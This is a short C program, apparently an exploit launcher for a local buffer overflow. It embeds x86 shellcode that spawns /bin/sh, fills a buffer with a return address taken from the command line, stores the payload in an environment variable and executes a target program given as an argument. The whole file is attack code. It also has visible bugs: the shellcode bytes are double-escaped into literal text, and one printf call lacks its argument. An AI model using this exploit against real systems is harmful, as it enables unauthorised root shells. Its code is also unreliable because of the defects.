 
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

extern char **environ;
int main(int argc, char **argv)
{
        char large_string[128];
        long *long_ptr = (long *) large_string;
        int i;
        char shellcode[] =
                "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07"
                "\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d"
                "\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd"
                "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";
        printf("1\n");
        for (i = 0; i < 32; i++)
                *(long_ptr + i) = (int) strtoul(argv[2], NULL, 16);
         printf("2 long_ptr : %s\n", long_ptr);
        for (i = 0; i < (int) strlen(shellcode); i++){
                printf("i=%i\n");
                large_string[i] = shellcode[i];
            }
         printf("3\n");
        setenv("KIRIKA", large_string, 1);
         printf("4\n");
        execle(argv[1], argv[1], NULL, environ);
         printf("5\n");
        return 0;
}

